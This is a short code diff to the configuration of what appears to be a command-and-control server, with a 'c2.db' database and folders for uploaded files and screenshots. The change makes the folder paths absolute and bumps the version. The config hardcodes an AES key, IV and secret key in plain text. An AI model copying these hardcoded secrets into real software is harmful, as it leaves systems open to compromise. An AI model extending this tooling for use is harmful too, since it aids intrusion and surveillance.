@@ -9,11 +9,11 @@ class Config:
         self.database = "c2.db"
         self.aes_key = b"32bytekey-ultra-tecure-123456789"
         self.aes_iv = b"16byteiv-9876543"
-        self.upload_folder = "uploads"
-        self.screenshot_folder = "screenshots"
+        self.upload_folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'uploads'))
+        self.screenshot_folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'screenshots'))
         self.max_content_length = 500 * 1024 * 1024  # 500MB
         self.secret_key = "mQsjJsMfsW43sdzPf9L2Sr78"
-        self.version = "2.1.1"
+        self.version = "2.1.3"
         self.monitor_token = secrets.token_urlsafe(32)  
 
         
